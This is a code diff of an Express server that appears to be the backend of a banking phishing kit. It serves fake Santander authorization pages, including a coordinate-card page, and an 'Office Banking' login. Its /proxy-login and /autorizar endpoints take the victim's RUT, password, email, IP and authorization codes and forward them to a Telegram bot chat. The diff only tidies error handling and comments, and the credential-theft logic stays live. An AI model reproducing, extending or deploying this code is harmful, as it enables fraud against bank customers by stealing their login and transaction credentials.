@@ -1,10 +1,11 @@
+server al 29/03
+
 const express = require("express");
 const cors = require("cors");
 const fs = require("fs");
 const path = require("path");
-
-// ✅ Compatibilidad con Node <18
-const fetch = require("node-fetch");
+// Si tu Node es <18, instala node-fetch y descomenta:
+// const fetch = require("node-fetch");
 
 const app = express();
 app.use(cors());
@@ -23,7 +24,7 @@ app.post("/config", (req, res) => {
   res.json(req.body);
 });
 
-// Ruta directa al admin
+// Ruta directa al admin (URL corta)
 app.get("/admin", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "admin.html"));
 });
@@ -31,12 +32,17 @@ app.get("/admin", (req, res) => {
 // Decidir qué página de autorización mostrar
 app.get("/autorizacion", (req, res) => {
   const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
+
   if (cfg.tipoAutorizacion === "santander") {
-    return res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
+    res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
+    return;
   }
+
   if (cfg.tipoAutorizacion === "coordenadas") {
-    return res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
+    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
+    return;
   }
+
   res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
 });
 
@@ -49,13 +55,15 @@ app.post("/autorizar", async (req, res) => {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
+
+    // ✅ Mensaje diferenciado
+    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
   } catch (err) {
-    console.error("Error enviando a Telegram:", err.message);
-    // ⚠️ No rompemos el flujo
+    res.status(500).json({ status: "error", error: err.message });
   }
-  res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
 });
 
+// Endpoint para login → enviar credenciales o correo a Telegram
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
@@ -73,12 +81,12 @@ app.post("/proxy-login", async (req, res) => {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
-  } catch (err) {
-    console.error("Error enviando a Telegram:", err.message);
-    // ⚠️ No devolvemos 500, devolvemos igual OK para que el frontend avance
-  }
 
-  res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
+    // ✅ Mensaje diferenciado
+    res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
+  } catch (err) {
+    res.status(500).json({ status: "error", error: err.message });
+  }
 });
 
 // Servir index.html por defecto
@@ -87,8 +95,4 @@ app.get("/", (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Servidor corriendo en puerto ${PORT}`);
-  console.log("Node version:", process.version);
-});
-
+app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
